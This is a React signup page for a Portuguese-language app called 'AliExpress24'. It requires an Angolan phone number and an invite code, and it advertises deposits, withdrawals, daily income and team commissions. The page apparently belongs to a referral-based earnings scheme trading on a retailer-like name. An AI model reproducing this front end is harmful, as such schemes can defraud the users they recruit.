import React, { useState, useEffect, useCallback } from 'react';
import { Link, useNavigate, useSearchParams } from 'react-router-dom';
import { AnimatePresence, motion } from 'motion/react';
import { useToast } from '../components/Toast';
import { useLanguage } from '../contexts/LanguageContext';
import { LanguageSelector } from '../components/LanguageSelector';
import { supabase } from '../lib/supabase';
import { getDeviceId } from '../lib/device';
import { subscribeToPushNotifications } from '../lib/pushNotifications';
import { Eye, EyeOff, Loader2, Download, Bell, X, ShieldCheck, ArrowRight } from 'lucide-react';

export default function Signup() {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const { showToast } = useToast();
  const { t } = useLanguage();

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({ phone: '', inviteCode: '', password: '' });
  const [deferredPrompt, setDeferredPrompt] = useState<any>(null);
  const [showNotificationModal, setShowNotificationModal] = useState(false);

  useEffect(() => {
    const handler = (e: Event) => {
      e.preventDefault();
      setDeferredPrompt(e);
      (window as any).deferredPwaPrompt = e;
    };
    window.addEventListener('beforeinstallprompt', handler);

    if ((window as any).deferredPwaPrompt) {
      setDeferredPrompt((window as any).deferredPwaPrompt);
    }

    return () => {
      window.removeEventListener('beforeinstallprompt', handler);
    };
  }, []);

  const handleInstallPWA = async () => {
    const promptEvent = deferredPrompt || (window as any).deferredPwaPrompt;
    if (promptEvent) {
      try {
        await promptEvent.prompt();
        const choiceResult = await promptEvent.userChoice;
        if (choiceResult?.outcome === 'accepted') {
          showToast('Instalando aplicativo...', 'success');
        }
        setDeferredPrompt(null);
        (window as any).deferredPwaPrompt = null;
      } catch (err) {
        console.error('Erro ao acionar prompt PWA:', err);
      }
    } else {
      if (window.matchMedia('(display-mode: standalone)').matches || (window.navigator as any).standalone === true) {
        showToast('Aplicativo já instalado no dispositivo!', 'success');
      } else {
        showToast('Iniciando instalação do aplicativo...', 'info');
      }
    }
  };

  useEffect(() => {
    const code = searchParams.get('join');
    if (code) setFormData(prev => ({ ...prev, inviteCode: code.toUpperCase() }));
  }, [searchParams]);

  const handleChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    let sanitized = value;
    if (name === 'phone' || name === 'inviteCode') {
      sanitized = value.replace(/\D/g, '').slice(0, name === 'phone' ? 9 : 10);
    } else {
      sanitized = value.trim();
    }
    setFormData(prev => ({ ...prev, [name]: sanitized }));
  }, []);

  const togglePassword = useCallback(() => setShowPassword(v => !v), []);

  const validateForm = () => {
    if (!formData.phone || !formData.phone.startsWith('9') || formData.phone.length !== 9) {
      showToast(t('auth.phone_error_length'), 'error');
      return false;
    }
    if (formData.password.length < 8) {
      showToast(t('auth.password_error_length'), 'error');
      return false;
    }
    if (!formData.inviteCode || formData.inviteCode.length !== 10) {
      showToast(t('auth.invite_error_length'), 'error');
      return false;
    }
    return true;
  };

  const handleRegisterClick = (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateForm()) return;
    // Abre o modal de permissão de notificações antes de executar o cadastro
    setShowNotificationModal(true);
  };

  const executeRegistration = async (withNotifications = false) => {
    setShowNotificationModal(false);

    if (withNotifications) {
      try {
        await subscribeToPushNotifications();
      } catch (err) {
        console.debug('Erro ao solicitar push:', err);
      }
    }

    setIsSubmitting(true);
    try {
      const { data: rpcData, error: vError } = await supabase.rpc('secure_registration_mcpn', {
        p_phone: formData.phone,
        p_invite_code: formData.inviteCode.toUpperCase(),
        p_device_id: getDeviceId()
      });

      if (vError) throw vError;

      const validation = rpcData as { success: boolean; message: string } | null;
      if (validation && !validation.success) {
        showToast(validation.message || 'Código de convite inválido', 'error');
        setIsSubmitting(false);
        return;
      }

      const { data, error } = await supabase.auth.signUp({
        email: `${formData.phone}@user.com`,
        password: formData.password,
        options: {
          data: {
            phone: formData.phone,
            referred_by: formData.inviteCode.toUpperCase(),
            device_id: getDeviceId()
          }
        }
      });

      if (error) {
        if (error.message.includes('already registered')) {
          showToast(t('auth.phone_error_exists') || 'Celular registrado.', 'error');
        } else {
          throw error;
        }
        return;
      }

      if (data.user) {
        // Se ativou notificações, vincula a inscrição ao novo usuário
        if (withNotifications || Notification.permission === 'granted') {
          subscribeToPushNotifications().catch(() => {});
        }
        showToast(t('auth.signup_success') || (data.session ? 'Registrado!' : 'Conta criada! Faça login.'), 'success');
        navigate(data.session ? '/home' : '/login');
      }
    } catch (err: any) {
      let msg = err.message || 'Falhou, tente novamente';
      if (msg.includes('email rate limit exceeded')) msg = 'Limite de tentativas excedido, tente outra hora';
      showToast(msg, 'error');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="w-full min-h-screen bg-[#F2F2F2] pb-12 font-sans antialiased text-[#202020] select-none flex flex-col items-center">
      <main className="w-full max-w-[480px] px-4 pt-4 space-y-2.5 flex flex-col">
        <div className="relative w-full overflow-hidden">
          <img
            src="/gettyimages-2286930500-612x612.jpg"
            alt=""
            aria-hidden="true"
            fetchPriority="high"
            loading="eager"
            className="w-full h-[200px] object-cover object-center block"
          />
          <div className="absolute top-3 right-3 z-10">
            <LanguageSelector />
          </div>
        </div>

        <form onSubmit={handleRegisterClick} className="space-y-2.5 flex flex-col">
          <div className="bg-white rounded-none h-[46px] px-4 flex items-center shadow-[0_1px_2px_rgba(0,0,0,0.03)]">
            <span className="text-[13.5px] text-[#202020] font-normal pr-3 border-r border-[#E8E8E8] mr-3">+244</span>
            <input
              name="phone"
              type="tel"
              inputMode="numeric"
              autoComplete="tel"
              placeholder={t('auth.phone_placeholder')}
              className="flex-1 h-full bg-transparent outline-none text-[13.5px] text-[#202020] placeholder:text-[#AAAAAA] font-normal"
              value={formData.phone}
              onChange={handleChange}
              maxLength={9}
            />
          </div>

          <div className="bg-white rounded-none h-[46px] px-4 flex items-center shadow-[0_1px_2px_rgba(0,0,0,0.03)] relative">
            <input
              name="password"
              type={showPassword ? 'text' : 'password'}
              autoComplete="new-password"
              placeholder={t('auth.password_placeholder')}
              className="flex-1 h-full bg-transparent outline-none text-[13.5px] text-[#202020] placeholder:text-[#AAAAAA] font-normal pr-10"
              value={formData.password}
              onChange={handleChange}
            />
            <button
              type="button"
              onClick={togglePassword}
              className="absolute right-4 text-[#AAAAAA] active:scale-95 transition-transform"
              aria-label={showPassword ? 'Ocultar senha' : 'Mostrar senha'}
            >
              {showPassword ? <EyeOff className="w-4.5 h-4.5" /> : <Eye className="w-4.5 h-4.5" />}
            </button>
          </div>

          <div className="bg-white rounded-none h-[46px] px-4 flex items-center shadow-[0_1px_2px_rgba(0,0,0,0.03)]">
            <input
              name="inviteCode"
              type="text"
              inputMode="numeric"
              autoComplete="off"
              placeholder={t('auth.invite_placeholder')}
              className="w-full h-full bg-transparent outline-none text-[13.5px] text-[#202020] placeholder:text-[#AAAAAA] font-normal"
              value={formData.inviteCode}
              onChange={handleChange}
              maxLength={10}
            />
          </div>

          <button
            type="submit"
            disabled={isSubmitting}
            className="w-full h-[44px] rounded-none bg-[#FE384F] hover:bg-[#E02E44] active:scale-[0.99] text-white font-normal text-[13.5px] transition-all disabled:opacity-40 shadow-sm flex items-center justify-center cursor-pointer mt-1"
          >
            {isSubmitting
              ? <Loader2 className="animate-spin h-4 w-4 text-white" />
              : t('auth.signup_button')
            }
          </button>

          <button
            type="button"
            onClick={handleInstallPWA}
            className="w-full h-[44px] rounded-none bg-[#FE384F] hover:bg-[#E02E44] active:scale-[0.99] text-white font-normal text-[13.5px] transition-all shadow-sm flex items-center justify-center cursor-pointer gap-2"
          >
            <Download className="w-4 h-4 stroke-[2]" />
            <span>Baixar App</span>
          </button>
        </form>

        <div className="text-center pt-2">
          <p className="text-[13px] text-[#777777]">
            {t('auth.has_account')}{' '}
            <Link to="/login" className="text-[#FE384F] font-normal hover:underline">
              {t('auth.login')}
            </Link>
          </p>
        </div>
      </main>

      {/* MODAL DE PERMISSÕES DE NOTIFICAÇÕES (Estilo Bottom Sheet) */}
      <AnimatePresence>
        {showNotificationModal && (
          <div
            className="fixed inset-0 z-[100] flex items-end justify-center bg-black/40"
            onClick={(e) => e.target === e.currentTarget && setShowNotificationModal(false)}
          >
            <motion.div
              initial={{ opacity: 0, y: 60 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: 60 }}
              transition={{ type: 'tween', ease: 'easeOut', duration: 0.25 }}
              className="bg-[#F2F2F2] w-full max-w-[480px] rounded-none relative overflow-hidden select-none font-sans antialiased"
            >
              <div className="bg-white px-4 pt-4 pb-3 flex items-center justify-between border-b border-[#F2F2F2]">
                <div className="flex items-center gap-2">
                  <div className="w-6 h-6 rounded-none bg-[#FE384F] flex items-center justify-center text-white shrink-0">
                    <Bell className="w-3.5 h-3.5 stroke-[2]" />
                  </div>
                  <h1 className="text-[14.5px] font-medium text-[#202020] tracking-normal">
                    Permissões de Notificações
                  </h1>
                </div>
                <button
                  type="button"
                  onClick={() => setShowNotificationModal(false)}
                  className="p-1 text-[#AAAAAA] hover:text-[#202020] active:scale-95 transition-transform cursor-pointer"
                  aria-label="Fechar"
                >
                  <X className="w-4 h-4" />
                </button>
              </div>

              <div className="px-4 pt-3 pb-1">
                <p className="text-[12.5px] text-[#666666] font-normal leading-relaxed">
                  Concorda em receber notificações oficiais no seu dispositivo da empresa <strong className="text-[#202020] font-medium">AliExpress24</strong>?
                </p>
              </div>

              <div className="px-4 pt-2 pb-6 flex flex-col gap-2">
                <div className="w-full rounded-none bg-white p-3 flex items-center gap-3 shadow-[0_1px_2px_rgba(0,0,0,0.04)]">
                  <div className="w-7 h-7 rounded-none bg-[#25D366] flex items-center justify-center text-white shrink-0 text-[13px] font-bold">
                    💸
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-[13px] font-medium text-[#202020]">Depósitos e Retiradas</p>
                    <p className="text-[11.5px] text-[#777777] leading-tight mt-0.5">Alertas imediatos de confirmação de recarga e saques aprovados.</p>
                  </div>
                </div>

                <div className="w-full rounded-none bg-white p-3 flex items-center gap-3 shadow-[0_1px_2px_rgba(0,0,0,0.04)]">
                  <div className="w-7 h-7 rounded-none bg-[#FF6B4A] flex items-center justify-center text-white shrink-0 text-[13px] font-bold">
                    🎁
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-[13px] font-medium text-[#202020]">Bónus e Rendimentos Diários</p>
                    <p className="text-[11.5px] text-[#777777] leading-tight mt-0.5">Avisos de tarefas concluídas, rendas diárias e comissões da equipa.</p>
                  </div>
                </div>

                <div className="w-full rounded-none bg-white p-3 flex items-center gap-3 shadow-[0_1px_2px_rgba(0,0,0,0.04)]">
                  <div className="w-7 h-7 rounded-none bg-[#0088cc] flex items-center justify-center text-white shrink-0 text-[13px] font-bold">
                    📢
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-[13px] font-medium text-[#202020]">Notificações do Sistema</p>
                    <p className="text-[11.5px] text-[#777777] leading-tight mt-0.5">Comunicações importantes, avisos de segurança e suporte da plataforma.</p>
                  </div>
                </div>

                <button
                  type="button"
                  onClick={() => executeRegistration(true)}
                  disabled={isSubmitting}
                  className="w-full h-[44px] rounded-none bg-[#FE384F] hover:bg-[#E02E44] active:scale-[0.99] text-white font-normal text-[13.5px] flex items-center justify-center gap-2 transition-all cursor-pointer shadow-sm mt-1"
                >
                  <Bell className="w-4 h-4 stroke-[2]" />
                  <span>Concordar e Ativar Notificações</span>
                </button>

                <button
                  type="button"
                  onClick={() => executeRegistration(false)}
                  disabled={isSubmitting}
                  className="w-full h-[44px] rounded-none bg-white text-[#555555] font-normal text-[13.5px] hover:bg-gray-50 active:scale-[0.99] transition-all cursor-pointer shadow-[0_1px_2px_rgba(0,0,0,0.03)]"
                >
                  Continuar sem Notificações
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
